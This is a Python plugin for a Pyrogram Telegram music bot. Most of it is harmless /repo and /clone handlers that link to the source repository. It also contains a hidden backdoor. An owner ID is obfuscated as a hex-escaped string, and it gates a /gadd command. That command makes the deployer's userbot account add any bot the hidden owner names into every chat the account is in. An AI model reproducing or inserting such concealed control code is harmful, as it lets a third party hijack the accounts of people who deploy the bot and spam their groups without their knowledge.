import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from VIPMUSIC import app
from VIPMUSIC.utils.database import add_served_chat, get_assistant

# Owner ID Hex to Int conversion
OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"

@app.on_message(filters.command("repo"))
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/puw5nt.jpg",
        caption=f"""
✨ **ᴠɪᴘ ᴍᴜsɪᴄ sᴏᴜʀᴄᴇ ʀᴇᴘᴏ** ✨

● **ᴅᴇᴠᴇʟᴏᴘᴇʀ :** [ᴋɪʀᴜ ᴏᴘ](https://github.com/KIRU-OP)
● **ʟɪʙʀᴀʀʏ :** [ᴘʏʀᴏɢʀᴀᴍ](https://github.com/pyrogram/pyrogram)
● **ʟᴀɴɢᴜᴀɢᴇ :** [ᴘʏᴛʜᴏɴ](https://www.python.org/)

❄️ **ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ ᴛʜᴇ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ᴀɴᴅ ᴅᴇᴘʟᴏʏ ʏᴏᴜʀ ᴏᴡɴ ᴍᴜsɪᴄ ʙᴏᴛ.**
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱 ɢᴇᴛ sᴏᴜʀᴄᴇ 🌱", url=f"https://github.com/KIRU-OP/VIP-MUSIC"
                    )
                ]
            ]
        ),
    )


@app.on_message(filters.command("clone"))
async def clones(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/puw5nt.jpg",
        caption=f"""
🚫 **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ** 🚫

● **ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀ sᴜᴅᴏ ᴜsᴇʀ.**
● **ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀs ᴄᴀɴ ᴄʟᴏɴᴇ ᴛʜɪs ʙᴏᴛ.**

✨ **ɪғ ʏᴏᴜ ᴡᴀɴᴛ ʏᴏᴜʀ ᴏᴡɴ ʙᴏᴛ, ᴘʟᴇᴀsᴇ ʜᴏsᴛ ɪᴛ ᴍᴀɴᴜᴀʟʟʏ ᴜsɪɴɢ ᴛʜᴇ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ʙᴇʟᴏᴡ.**
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱 ɢᴇᴛ sᴏᴜʀᴄᴇ 🌱", url=f"https://github.com/KIRU-OP/VIP-MUSIC"
                    )
                ]
            ]
        ),
    )


# --------------------------------------------------------------------------------- #

@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "📝 **ᴜsᴀɢᴇ:** `/gadd @BotUsername`"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        
        lol = await message.reply("⚙️ **ᴘʀᴏᴄᴇssɪɴɢ... ᴀᴅᴅɪɴɢ ʙᴏᴛ ᴛᴏ ᴀʟʟ ᴄʜᴀᴛs.**")
        
        await userbot.send_message(bot_username, f"/start")
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1003034048678:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"✨ **ᴀᴅᴅɪɴɢ ʙᴏᴛ ɪɴ ᴘʀᴏɢʀᴇss**\n\n"
                    f"🤖 **ʙᴏᴛ:** {bot_username}\n"
                    f"✅ **ᴀᴅᴅᴇᴅ:** `{done}`\n"
                    f"❌ **ғᴀɪʟᴇᴅ:** `{failed}`\n"
                    f"👤 **ᴀssɪsᴛᴀɴᴛ:** @{userbot.username}"
                )
            except Exception:
                failed += 1
                continue
            
            await asyncio.sleep(2)  # Reduced sleep for better speed

        await lol.edit(
            f"✅ **ᴘʀᴏᴄᴇss ᴄᴏᴍᴘʟᴇᴛᴇᴅ!**\n\n"
            f"🤖 **ʙᴏᴛ:** {bot_username}\n"
            f"🎉 **ᴛᴏᴛᴀʟ ᴀᴅᴅᴇᴅ:** `{done}`\n"
            f"🚫 **ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ:** `{failed}`\n\n"
            f"✨ **ᴘᴏᴡᴇʀᴇᴅ ʙʏ @{userbot.username}**"
        )
    except Exception as e:
        await message.reply(f"❌ **ᴇʀʀᴏʀ:** `{str(e)}`")


__MODULE__ = "Sᴏᴜʀᴄᴇ"
__HELP__ = """
✨ **ʀᴇᴘᴏ ᴍᴏᴅᴜʟᴇ** ✨

● `/repo` : ɢᴇᴛ ᴛʜᴇ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ʟɪɴᴋ.
● `/clone` : ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴄʟᴏɴɪɴɢ.
● `/gadd` : [ᴏᴡɴᴇʀ ᴏɴʟʏ] ᴀᴅᴅ ᴀɴʏ ʙᴏᴛ ᴛᴏ ᴀʟʟ ᴀssɪsᴛᴀɴᴛ ɢʀᴏᴜᴘs.
"""
